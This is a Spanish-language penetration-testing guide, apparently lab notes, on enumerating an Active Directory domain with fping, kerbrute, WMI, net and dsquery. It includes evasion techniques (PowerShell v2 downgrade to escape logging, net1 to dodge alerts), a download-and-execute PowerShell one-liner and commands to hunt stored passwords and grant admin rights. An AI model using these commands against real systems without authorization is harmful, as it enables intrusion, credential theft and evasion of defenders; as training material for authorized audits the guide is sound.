
Es habitual comenzar una auditoría **desde un host Linux sin credenciales de dominio**. Muchas organizaciones prefieren ver qué se puede lograr desde una posición ciega, lo que simula escenarios reales como:

- Un atacante que compromete la red desde Internet (phishing, RCE, VPN expuesta...).    
- Acceso físico (invitado malicioso, acceso a un puerto LAN).    
- Acceso Wi-Fi desde fuera del edificio.    
- Un empleado desleal o comprometido.    

🟡 **Según el resultado**, el cliente puede decidir facilitarte:
- Un **host unido al dominio**, o    
- Unas **credenciales limitadas** para acelerar y ampliar la auditoría.

| Punto clave                      | Descripción |
|----------------------------------|-------------|
| **Usuarios de AD (AD Users)**    | Enumerar cuentas válidas que puedan ser objetivo de ataques como password spraying o ASREPRoasting. |
| **Equipos unidos al dominio**    | Especialmente los críticos: Controladores de Dominio, servidores de ficheros, SQL, web, correo (Exchange), etc. |
| **Servicios clave**              | Detectar servicios como Kerberos (88/TCP), LDAP (389/TCP), NetBIOS (137/139), DNS (53), SMB (445), que indiquen entorno Windows-AD. |
| **Equipos y servicios vulnerables** | Buscar “quick wins” — hosts con vulnerabilidades explotables que te permitan obtener acceso inicial (SMB abierto, RCE conocida, credenciales por defecto, etc.). |

🛠️ **Importante**: guarda los resultados de las herramientas (`nmap`, `smbclient`, `crackmapexec`, etc.) y capturas clave. Todo lo que documentes aquí puede justificar el acceso posterior o elevar la criticidad del informe.

### 🎯 TTPs (Tácticas, Técnicas y Procedimientos) para enumerar Active Directory

Enumerar un entorno de Active Directory **sin un plan claro puede ser abrumador**. Hay **una enorme cantidad de datos** en AD y si lo haces todo de golpe, puedes perder información relevante o duplicar trabajo inútil.

🔸 Lo recomendable es **trabajar por etapas**, desarrollando tu propia **metodología repetible** a medida que ganes experiencia. Aunque cada pentester tiene su estilo, el flujo inicial suele seguir una misma lógica.

##### 🧭 Metodología general propuesta

1. **🎯 Establece un plan**    
    - Define claramente qué vas a buscar en cada fase.        
    - No te limites a una sola herramienta, prueba varias para ver diferencias, sintaxis y resultados.
        
2. **🔎 Detección pasiva de hosts**    
    - Escucha el entorno sin generar tráfico activo (por ejemplo: ARP, mDNS, LLMNR).        
    - Ideal en escenarios stealth o con restricciones.
        
3. **📡 Validación activa de hosts detectados**    
    - Escaneos activos (`nmap`, `smbclient`, `ldapsearch`, etc.).        
    - Identificar servicios, nombres de máquina, posibles vulnerabilidades.
        
4. **🔍 Recolección de información interesante**    
    - Consultas LDAP, detección de sesiones activas, shares abiertos, SPNs, GPOs, etc.        
    - Guardar todo lo que tenga potencial de explotación o acceso a datos internos.
        
5. **🧠 Revisión y planificación**    
    - Evalúa lo obtenido: ¿tenemos ya una cuenta de usuario o credenciales válidas?        
    - Si es así, comenzar con **enumeración autenticada** desde tu host atacante (Linux) o pivotar a una máquina unida al dominio.

En auditorías black-box, conviene **escuchar primero la red** con herramientas como **Wireshark** o **tcpdump**, antes de lanzar escaneos.
Aunque en redes conmutadas solo vemos el tráfico del dominio de broadcast, podemos identificar:
- IPs activas vía **ARP**    
- Nombres de host mediante **mDNS/LLMNR**    
- Tráfico que indica presencia de **Active Directory** (LDAP, Kerberos)   

Esto ayuda a entender la red sin generar ruido y planificar los siguientes pasos.

### Usando fping

`fping` es similar a `ping`, pero más eficiente para escaneos en red. Permite enviar peticiones ICMP a múltiples direcciones a la vez, lo que lo hace útil en auditorías internas.

- Acepta rangos o listas de IPs.    
- Funciona en modo round-robin, sin esperar respuesta completa de cada host antes de continuar.    
- Es scriptable y rápido.    

Aunque ICMP no muestra toda la actividad posible, permite tener una primera visión de los hosts activos. A partir de ahí, se puede combinar con escaneos más profundos por puertos y servicios. Aquí iniciaremos `fping` con algunos flags:

- `a` para mostrar los objetivos que están activos,    
- `s` para imprimir estadísticas al final del escaneo,    
- `g` para generar una lista de objetivos a partir de una red en formato CIDR,    
- y `q` para no mostrar resultados por cada objetivo.

```shell-session
amr251@htb[/htb]$ fping -asgq 172.16.5.0/23

172.16.5.5
172.16.5.25
172.16.5.50
172.16.5.100
172.16.5.125
172.16.5.200
172.16.5.225
172.16.5.238
172.16.5.240
...SNIP...
```

El comando anterior valida qué hosts están activos en la red `/23` y lo hace de forma silenciosa, en lugar de saturar la terminal con resultados para cada IP de la lista objetivo. Podemos combinar los resultados exitosos con la información obtenida en las comprobaciones pasivas para crear una lista y realizar un escaneo más detallado con Nmap. A partir del comando `fping`, podemos ver 9 "hosts vivos", incluyendo nuestro host de ataque.

### Identificando usuarios

Si el cliente no nos proporciona una cuenta de usuario para comenzar las pruebas (lo cual es habitual), necesitaremos encontrar una forma de **obtener acceso al dominio** mediante alguno de estos métodos:

- Credenciales en texto claro    
- Un **hash NTLM** de un usuario    
- Una **shell SYSTEM** en un host unido al dominio    
- Una shell en el **contexto de un usuario de dominio**    

Conseguir un usuario válido con sus credenciales es un paso **crítico** en las fases iniciales de una auditoría interna. Incluso con acceso de bajo nivel, se abren muchas posibilidades para realizar **enumeración más avanzada** e incluso lanzar ataques posteriores.

Veamos una forma de empezar a construir una lista de usuarios válidos en un dominio, que podremos usar más adelante en la evaluación.

### Kerbrute - Enumeración de usuarios desde dentro en AD

Kerbrute es una opción más discreta para **enumerar cuentas de dominio**, ya que se basa en errores de preautenticación de Kerberos, los cuales **normalmente no generan logs ni alertas**.

Se utiliza junto a diccionarios como `jsmith.txt` o `jsmith2.txt` del repositorio de **Insidetrust**, que incluye múltiples listas de usuarios muy útiles para esta fase cuando partimos sin autenticación.

Apuntamos Kerbrute contra el **controlador de dominio (DC)** identificado previamente y le pasamos una wordlist. Es rápido y nos indica si los usuarios existen o no, lo cual sirve como punto de partida para ataques como **password spraying** (que veremos más adelante).

```shell-session
kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

2021/11/17 23:01:46 >  Using KDC(s):
2021/11/17 23:01:46 >   172.16.5.5:88
2021/11/17 23:01:46 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
2021/11/17 23:01:50 >  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL

 <SNIP>
 
2021/11/17 23:01:51 >  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL
2021/11/17 23:01:52 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
2021/11/17 23:01:56 >  Done! Tested 48705 usernames (56 valid) in 9.940 seconds
```


### Cuenta LOCAL SYSTEM (`NT AUTHORITY\SYSTEM`) en entornos Windows

`NT AUTHORITY\SYSTEM` es una cuenta interna del sistema operativo Windows con el **máximo nivel de privilegios**. Es la cuenta que utilizan muchos servicios de Windows (y algunos de terceros) para ejecutarse por defecto.

En un host unido a un dominio, obtener acceso como SYSTEM permite **enumerar el Active Directory** actuando como la **cuenta del equipo**, que también es un objeto de usuario dentro del dominio.

Tener acceso SYSTEM en una máquina unida al dominio es, en la práctica, casi equivalente a tener una cuenta de usuario del dominio.

---

### Formas comunes de obtener acceso SYSTEM:

- Explotar vulnerabilidades remotas: **MS08-067**, **EternalBlue**, **BlueKeep**    
- Abusar de servicios que se ejecutan como SYSTEM o del privilegio `SeImpersonate` mediante herramientas como **Juicy Potato** (funciona en sistemas antiguos, pero no en versiones modernas como Server 2019)    
- Usar fallos de escalada de privilegios locales (por ejemplo, 0-day del programador de tareas en Windows 10)    
- Tener acceso administrador en una máquina del dominio y usar **PsExec** para lanzar una shell como SYSTEM    

---

### Qué puedes hacer con acceso SYSTEM en un host unido al dominio:

- Enumerar el dominio con herramientas como **BloodHound** o **PowerView**    
- Lanzar ataques de **Kerberoasting** o **ASREPRoasting**    
- Ejecutar **Inveigh** para capturar hashes Net-NTLMv2 o hacer SMB relay    
- Realizar **impersonación de tokens** para secuestrar sesiones de usuarios privilegiados    
- Ejecutar ataques sobre **permisos ACL** en objetos de AD

Ten en cuenta el **alcance y estilo de la auditoría** al elegir las herramientas a utilizar.
Si estás realizando una **auditoría no evasiva** (todo comunicado y visible, con el personal del cliente al tanto), no importa demasiado el nivel de ruido que generes en la red.
Sin embargo, en una **auditoría evasiva**, una **evaluación adversarial** o un **ejercicio Red Team**, el objetivo es simular los TTPs de un atacante real, y en ese contexto la **discreción es fundamental**.
Lanzar Nmap contra toda la red no es precisamente sigiloso, y muchas de las herramientas habituales de pentesting pueden generar alertas si el cliente tiene un SOC preparado o un equipo Blue con experiencia.
Por eso, **asegúrate siempre de aclarar los objetivos y el estilo de la prueba con el cliente por escrito antes de comenzar**.

## Escenario

A continuación vamos a ver un escenario para AD y como enumerar todo tipo de información desde un host Windows. Supongamos que nuestro cliente nos ha pedido que probemos su entorno AD desde un equipo gestionado sin acceso a Internet, y todos los intentos de cargar herramientas en él han fracasado. El cliente quiere ver qué tipos de enumeración son posibles, así que tendremos que recurrir a “vivir del terreno” usando solo herramientas y comandos nativos de Windows/Active Directory. Esto también puede ser un enfoque más sigiloso y puede no generar tantos registros ni alertas como cuando incorporamos herramientas externas en secciones anteriores. La mayoría de los entornos empresariales actuales cuentan con algún tipo de monitorización y registro de red, incluidos IDS/IPS, cortafuegos y sensores pasivos, además de defensas en los propios hosts como Windows Defender o EDR corporativo. Dependiendo del entorno, también pueden tener sistemas que establecen una línea base de tráfico “normal” y buscan anomalías. Por ello, nuestras posibilidades de ser detectados aumentan exponencialmente cuando empezamos a introducir herramientas en el entorno desde el exterior.

##### Comandos de entorno para el host y reconocimiento de red

| Comando                                           | Resultado                                                                                       |
|---------------------------------------------------|-------------------------------------------------------------------------------------------------|
| `hostname`                                        | Imprime el nombre del equipo                                                                    |
| `[System.Environment]::OSVersion.Version`         | Muestra la versión y nivel de revisión del sistema operativo                                    |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Lista los parches y hotfixes instalados en el equipo                                             |
| `ipconfig /all`                                   | Muestra el estado y la configuración de los adaptadores de red                                   |
| `set`                                             | Muestra las variables de entorno de la sesión actual (ejecutado desde CMD)                      |
| `echo %USERDOMAIN%`                               | Muestra el nombre del dominio al que pertenece el equipo (ejecutado desde CMD)                  |
| `echo %logonserver%`                              | Imprime el nombre del controlador de dominio con el que el equipo inicia sesión (desde CMD)     |

El comando `systeminfo` imprime un resumen de la información del equipo en una sola salida concisa. Ejecutar un único comando genera menos registros, reduciendo así la probabilidad de ser detectados por un defensor.

##### Aprovechando PowerShell

| Cmdlet                                                                                     | Descripción                                                                                                                                                                |
| ------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Get-Module`                                                                               | Lista los módulos disponibles que están cargados para su uso.                                                                                                              |
| `Get-ExecutionPolicy -List`                                                                | Muestra las políticas de ejecución configuradas para cada ámbito (scope) en el equipo.                                                                                     |
| `Set-ExecutionPolicy Bypass -Scope Process`                                                | Cambia la política de ejecución solo para el proceso actual, revirtiéndose al cerrar o terminar el proceso. Ideal para no dejar cambios permanentes en el equipo víctima.  |
| `Get-ChildItem Env: \| ft Key,Value`                                                       | Muestra variables de entorno, como rutas, usuarios, información del equipo, etc.                                                                                           |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Obtiene el historial de comandos de PowerShell del usuario especificado, lo cual puede revelar contraseñas o indicar archivos de configuración o scripts con credenciales. |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL'); <comandos>"`     | Descarga y ejecuta rápidamente un script desde una URL en memoria usando PowerShell, sin guardar el archivo en disco (`-nop` = NoProfile).                                 |

##### Checkeos rápidos usando PowerShell

Hemos realizado una enumeración básica del equipo. Ahora, hablemos de algunas tácticas de seguridad operacional.

Muchos defensores desconocen que suelen existir varias versiones de PowerShell en un sistema. Si no se han desinstalado, todavía pueden utilizarse. El registro de eventos de PowerShell se introdujo a partir de la versión 3.0. Con esto en mente, podemos intentar invocar PowerShell 2.0 o anterior; si tiene éxito, nuestras acciones desde esa consola no quedarán registradas en el Visor de Eventos. Es una excelente forma de pasar desapercibidos mientras aprovechamos recursos nativos del sistema. A continuación, un ejemplo de cómo degradar la versión de PowerShell

##### Bajar la versión de PowerShell

```powershell-session
PS C:\htb> Get-host

Name             : ConsoleHost
Version          : 5.1.19041.1320
...SNIP...

PS C:\htb> powershell.exe -version 2
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.
```

Hemos comprobado que la versión de PowerShell se ha degradado con éxito y, a partir de ese momento, ya no se registran comandos en el registro operativo de PowerShell ni en el registro de Windows PowerShell. La última entrada en los logs coincide con el momento del downgrade, confirmando que la shell antigua no genera más eventos.

##### Examinando el log de eventos de PowerShell

![[PowershellLogs.png | 800]]

Con el registro de bloques de script activado ([Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2)), todo lo que escribimos en PowerShell v3+ queda grabado. Al degradar a PowerShell v2, el Script Block Logging deja de funcionar, y nuestras acciones posteriores ya no se registran. Hay que tener en cuenta que el propio comando de downgrade (`powershell.exe -version 2`) sí queda grabado, lo que deja evidencia del cambio y puede alertar a un defensor atento cuando vean que el log cesa tras esa entrada.

##### Starting V2 Logs

![[Powershell_Logs2.png | 1000]]

### Comprobando defensas

Los siguientes comandos usan las utilidades `netsh` y `sc` para ayudarnos a tener un estado del host en lo que se refiere a la configuración del Firewall y para comprobar el estado de Windows Defender.

##### Comprobando el FireWall

```powershell-session
PS C:\htb> netsh advfirewall show allprofiles
```

Para hacerlo desde cmd:

```cmd-session
C:\htb> sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Arriba, comprobamos si Defender está en ejecución. Abajo comprobaremos el estado y configuración con el cmdlet `Get-MpComputerStatus`

```powershell-session
PS C:\htb> Get-MpComputerStatus
```

Conocer la versión y configuración del antivirus nos indica la frecuencia de los escaneos, si la detección bajo demanda está activa y más. Además, es información clave para el informe, ya que puede revelar a los defensores ajustes deshabilitados o escaneos mal programados y ayudarles a corregirlo.

##### ¿Me encuentro solo?

Al acceder por primera vez a un equipo, verifica que no haya otros usuarios conectados; si interrumpes su sesión o provocas avisos, podrían descubrir tu presencia, cambiar credenciales y hacerte perder el acceso.

##### Usando `qwinsta`

```powershell-session
PS C:\htb> qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen
```

Ahora que tenemos una idea clara del estado de nuestro host, podemos enumerar la configuración de red del equipo e identificar posibles máquinas o servicios del dominio a los que queramos atacar a continuación.

### Información de red

| Comando de Red                          | Descripción                                                                                          |
|-----------------------------------------|------------------------------------------------------------------------------------------------------|
| `arp -a`                                | Lista todos los hosts conocidos almacenados en la tabla ARP.                                         |
| `ipconfig /all`                         | Muestra la configuración de los adaptadores del equipo y permite identificar el segmento de red.     |
| `route print`                           | Muestra la tabla de enrutamiento (IPv4 e IPv6), identificando redes conocidas y rutas de capa 3.    |
| `netsh advfirewall show allprofiles`    | Muestra el estado del firewall del equipo, indicando si está activo y si filtra tráfico.            |
Comandos como `ipconfig /all` y `systeminfo` nos muestran algunas configuraciones básicas de red. Otros dos comandos más importantes nos proporcionan una gran cantidad de datos valiosos y podrían ayudarnos a ampliar nuestro acceso. `arp -a` y `route print` nos mostrarán qué hosts conoce la máquina en la que estamos y qué redes son conocidas por el equipo. Cualquier red que aparezca en la tabla de enrutamiento es una posible vía de movimiento lateral porque se accede lo suficiente como para que se añada una ruta, o bien se ha configurado administrativamente para que el host sepa cómo acceder a los recursos del dominio. Estos dos comandos pueden ser especialmente útiles en la fase de descubrimiento de una evaluación de caja negra donde tenemos que limitar nuestro escaneo.

El uso de `arp -a` y `route print` no solo ayuda a enumerar entornos AD, sino que también nos permite identificar oportunidades para pivotar a diferentes segmentos de red en cualquier entorno. Son comandos que deberíamos considerar utilizar en cada auditoría para ayudar a nuestros clientes a entender hacia dónde podría intentar desplazarse un atacante tras la compromisa inicial.

### Windows Management Instrumentation (WMI)

Windows Management Instrumentation (WMI) es un motor de scripting ampliamente utilizado en entornos empresariales Windows para obtener información y ejecutar tareas administrativas tanto en equipos locales como remotos. Para nuestro caso, generaremos un informe WMI sobre usuarios de dominio, grupos, procesos y otra información de nuestro equipo y de otros hosts del dominio.

##### Comprobaciones rápidas con WMI

| Comando                                                             | Descripción                                                                                              |
|---------------------------------------------------------------------|----------------------------------------------------------------------------------------------------------|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn`             | Muestra el nivel de parche y la descripción de los hotfixes aplicados                                    |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Muestra información básica del equipo, incluidos los atributos listados                                  |
| `wmic process list /format:list`                                    | Lista todos los procesos en el equipo                                                                    |
| `wmic ntdomain list /format:list`                                   | Muestra información sobre el dominio y los controladores de dominio                                      |
| `wmic useraccount list /format:list`                                | Muestra información de todas las cuentas locales y de dominio que hayan iniciado sesión en el equipo     |
| `wmic group list /format:list`                                      | Muestra información de todos los grupos locales                                                          |
| `wmic sysaccount list /format:list`                                 | Muestra información de las cuentas del sistema usadas como cuentas de servicio                            |
Abajo podemos ver información sobre el dominio y el dominio hijo, y el bosque externo con el que nuestro dominio actual tiene una relación de confianza. Veamos un cheatsheet de comandos con wmi:

##### Enumeración del Host

| Comando                                                                                                          | Descripción                                                                                                     |
|------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------|
| `wmic os LIST Full`                                                                                              | Muestra todos los detalles del sistema operativo (usar la propiedad `Caption` para obtener el nombre del SO).   |
| `wmic computersystem LIST full`                                                                                  | Muestra información completa del sistema (fabricante, modelo, usuario, roles, etc.).                            |
| `wmic /namespace:\\root\securitycenter2 path antivirusproduct`                                                    | Lista el producto antivirus instalado y su estado.                                                              |
| `wmic path Win32_PnPdevice`                                                                                      | Enumera los dispositivos Plug & Play conectados.                                                                |
| `wmic qfe list brief`                                                                                            | Lista los hotfixes y actualizaciones instalados de forma resumida.                                              |
| `wmic DATAFILE where "path='\\Users\\test\\Documents\\'" GET Name,readable,size`                                  | Lista archivos en la ruta indicada con nombre, permiso de lectura y tamaño.                                     |
| `wmic DATAFILE where "drive='C:' AND Name like '%password%'" GET Name,readable,size /VALUE`                      | Busca archivos cuyo nombre contenga “password” en C: y muestra nombre, permiso de lectura y tamaño.             |
| `wmic USERACCOUNT Get Domain,Name,Sid`                                                                           | Muestra todas las cuentas locales y de dominio que han iniciado sesión con su dominio, nombre y SID.            |

##### Enumeración del Dominio

| Comando                                                                                                          | Descripción                                                                                                     |
|------------------------------------------------------------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------|
| `wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE`                                               | Muestra la(s) dirección(es) del controlador de dominio, nombre del dominio y roles.                             |
| `wmic /NAMESPACE:\\root\directory\ldap PATH ds_user where "ds_samaccountname='testAccount'" GET`                | Obtiene atributos detallados del usuario `testAccount`.                                                         |
| `wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname`                                        | Lista el nombre SAM de todos los usuarios del dominio.                                                          |
| `wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname`                                       | Lista el nombre SAM de todos los grupos del dominio.                                                            |
| `wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" GET ds_member /Value` | Muestra los miembros (DN) del grupo “Domain Admins”.                                                            |
| `wmic path win32_groupuser where (groupcomponent="win32_group.name='domain admins',domain='YOURDOMAINHERE'")`    | Enumera usuarios y grupos anidados dentro de “Domain Admins”.                                                    |
| `wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_samaccountname`                                    | Lista el nombre SAM de todos los equipos del dominio.                                                           |
| `wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname`                                       | Lista el nombre DNS de todos los equipos del dominio.                                                           |

#### Miscelánea

| Comando                                                                                                               | Descripción                                                         |
| --------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| `wmic process call create "cmd.exe /c calc.exe"`                                                                      | Ejecuta remotamente el comando indicado (aquí abre la calculadora). |
| `wmic rdtoggle where AllowTSConnections="0" call SetAllowTSConnections "1"`                                           | Habilita Escritorio Remoto en el host local.                        |
| `wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"` | Habilita Escritorio Remoto en el host remoto especificado.          |

```powershell-session
PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

Caption          Description      DnsForestName           DomainControllerAddress  DomainName
ACADEMY-EA-MS01  ACADEMY-EA-MS01
INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC
```

### Comandos `net`

Los comandos `net` pueden resultar muy útiles para enumerar información del dominio. Con ellos se puede consultar tanto el equipo local como equipos remotos, de forma similar a lo que ofrece WMI. Podemos listar datos como:

- Usuarios locales y de dominio    
- Grupos    
- Hosts    
- Usuarios concretos en grupos    
- Controladores de dominio    
- Requisitos de contraseñas    

A continuación veremos algunos ejemplos. Ten en cuenta que los comandos de `net.exe` suelen estar monitorizados por soluciones EDR y pueden delatar rápidamente nuestra ubicación si la evaluación requiere sigilo. Algunas organizaciones configuran sus herramientas de monitorización para generar alertas cuando ciertos comandos se ejecutan desde usuarios pertenecientes a OU específicas, por ejemplo, si la cuenta de un Marketing Associate corre `whoami` o `net localgroup administrators`, lo que sería una señal de alerta inmediata para quien supervise la red.

| Comando                                        | Descripción                                                                          |
| ---------------------------------------------- | ------------------------------------------------------------------------------------ |
| `net accounts`                                 | Información sobre requisitos de contraseña                                           |
| `net accounts /domain`                         | Políticas de contraseña y bloqueo                                                    |
| `net group /domain`                            | Información sobre grupos de dominio                                                  |
| `net group "Domain Admins" /domain`            | Lista de usuarios con privilegios de administrador de dominio                        |
| `net group "domain computers" /domain`         | Lista de equipos unidos al dominio                                                   |
| `net group "Domain Controllers" /domain`       | Lista de cuentas de equipo de los controladores de dominio                           |
| `net group <nombre_del_grupo> /domain`         | Usuarios que pertenecen al grupo especificado                                        |
| `net groups /domain`                           | Lista de todos los grupos de dominio                                                 |
| `net localgroup`                               | Lista de todos los grupos locales                                                    |
| `net localgroup administrators /domain`        | Usuarios del grupo Administradores en el dominio (incluye Domain Admins por defecto) |
| `net localgroup Administrators`                | Información sobre el grupo Administrators                                            |
| `net localgroup administrators [usuario] /add` | Añade un usuario al grupo Administrators                                             |
| `net share`                                    | Consulta los recursos compartidos actuales                                           |
| `net user <NOMBRE_CUENTA> /domain`             | Información sobre un usuario en el dominio                                           |
| `net user /domain`                             | Lista de todos los usuarios del dominio                                              |
| `net user %username%`                          | Información sobre el usuario actual                                                  |
| `net use x: \\equipo\recurso`                  | Monta el recurso compartido localmente                                               |
| `net view`                                     | Obtiene una lista de equipos                                                         |
| `net view /all /domain[:nombre_dominio]`       | Recursos compartidos de todos los dominios o de uno específico                       |
| `net view \\equipo /ALL`                       | Lista de recursos compartidos de un equipo específico                                |
| `net view /domain`                             | Lista de equipos del dominio                                                         |
##### Listando grupos de dominio

```powershell-session
PS C:\htb> net group /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.
```

##### Información sobre un usuario de dominio

```powershell-session
PS C:\htb> net user /domain wrouse

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

User name                    wrouse
Full Name                    Christopher Davis
...SNIP...
```

Si sospechas que los defensores de red monitorizan el comando `net`, puedes usar `net1` en su lugar. Ambas invocaciones realizan las mismas funciones sin disparar alertas basadas en la cadena `net`.

### Dsquery

Dsquery es una útil herramienta de línea de comandos para encontrar objetos en Active Directory. Las consultas que realizamos con esta herramienta pueden replicarse fácilmente con herramientas como BloodHound o PowerView, pero quizá no siempre dispongamos de ellas, como comentamos al principio de la sección. Además, es probable que los administradores de dominio la tengan instalada en su entorno. En ese sentido, dsquery estará presente en cualquier equipo con el rol de Servicios de dominio de Active Directory instalado, y la DLL de dsquery (dsquery.dll) existe por defecto en todos los sistemas Windows modernos, ubicada en `C:\Windows\System32\dsquery.dll`.

##### Búsqueda de usuarios

```powershell-session
PS C:\htb> dsquery user
```

##### Búsqueda de ordenador

```powershell-session
PS C:\htb> dsquery computer
```

##### Búsqueda mediante Wildcard

```powershell-session
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

Un **wildcard** (o comodín) es un carácter especial que sirve para representar uno o varios caracteres desconocidos o variables en una cadena de búsqueda. En LDAP y en muchos comandos de Windows, el comodín más habitual es el asterisco (`*`), que significa “cualquier secuencia de caracteres (incluido ningún carácter)”. Podemos ver [aquí](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)) diferentes wildcards y su propósito.

Si quisieras buscar, por ejemplo, todos los usuarios cuyo nombre contenga “test”, podrías usar algo así:

```powershell
dsquery user "DC=INLANEFREIGHT,DC=LOCAL" -name *test*
```

Aquí:

- `user` indica que buscamos objetos de tipo usuario.    
- `"DC=INLANEFREIGHT,DC=LOCAL"` es la base DN donde comenzamos la búsqueda.    
- `-name *test*` aplica el wildcard antes y después de “test”, para que devuelva nombres como “test”, “testUser” o “mytest123”.    

Otros ejemplos de uso de comodines en LDAP:
- `cn=admin*` → cualquier `cn` que empiece por “admin” (p.ej. “administrator”, “admin01”).    
- `sAMAccountName=*svc*` → cualquier cuenta cuyo nombre contenga “svc”.    

En resumen, para que un wildcard funcione debes colocarlo dentro de un filtro (p. ej. `-name`, `-filter`) y no simplemente como base DN.

Podemos, por supuesto, combinar **dsquery** con filtros de búsqueda LDAP a medida. El siguiente ejemplo busca usuarios que tengan el flag `PASSWD_NOTREQD` establecido en el atributo `userAccountControl`:

```powershell-session
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

  distinguishedName                                                                              userAccountControl
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
```

##### Buscando controladores de dominio

```powershell-session
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

 sAMAccountName
 ACADEMY-EA-DC01$
```

### Filtrado LDAP explicado

Verás en las consultas anteriores que usamos cadenas como `userAccountControl:1.2.840.113556.1.4.803:=8192`. Estas cadenas son consultas LDAP comunes que también pueden emplearse con varias herramientas, entre ellas AD PowerShell, ldapsearch y muchas otras. Desglosemos rápidamente:

- `userAccountControl:1.2.840.113556.1.4.803:` indica que estamos filtrando por los atributos de User Account Control (UAC) de un objeto. Esta parte puede cambiar para incluir distintos valores (OID u Object Identifiers) según lo que busquemos en AD.
    
- `=8192` representa la máscara de bits decimal que queremos coincidir en esta búsqueda. Este número decimal corresponde a un flag de UAC concreto (por ejemplo, “password no requerido” o “cuenta bloqueada”). Estos valores pueden combinarse para dar lugar a múltiples flags simultáneos. A continuación tienes una lista rápida de posibles valores.

##### Valores UAC

![[UAC.png | 800]]

##### Cadenas de coincidencia OID

Los OID son reglas que se usan para comparar valores de bits con atributos, como vimos más arriba. Para LDAP y AD, existen tres reglas principales de coincidencia:

- **1.2.840.113556.1.4.803**  
Al usar esta regla, como en el ejemplo anterior, indicamos que el valor de bits debe coincidir por completo para cumplir los requisitos de búsqueda. Ideal para detectar un único atributo.

- **1.2.840.113556.1.4.804**  
Con esta regla, pedimos que los resultados incluyan cualquier objeto en el que coincida al menos un bit del conjunto. Útil cuando un objeto tiene varios atributos activos.

- **1.2.840.113556.1.4.1941**  
Esta regla se emplea para filtrar sobre el Distinguished Name de un objeto y busca a través de todas las entradas de pertenencia y propiedad anidadas.

##### Operadores lógicos

Al crear filtros LDAP podemos usar operadores lógicos para combinar criterios:

- **& (AND)**: obliga a que coincidan todos los criterios, p. ej.  
    `(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`  
    busca usuarios con el flag UAC 64 (“Password Can’t Change”).       
- **| (OR)**: basta que coincida uno, útil para agrupar diferentes atributos.    
- **! (NOT)**: invierte el criterio, p. ej.  
    `(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`  
    busca usuarios que **no** tengan ese flag.    

Combinando estos operadores con filtros UAC y reglas OID obtenemos búsquedas muy precisas en AD.

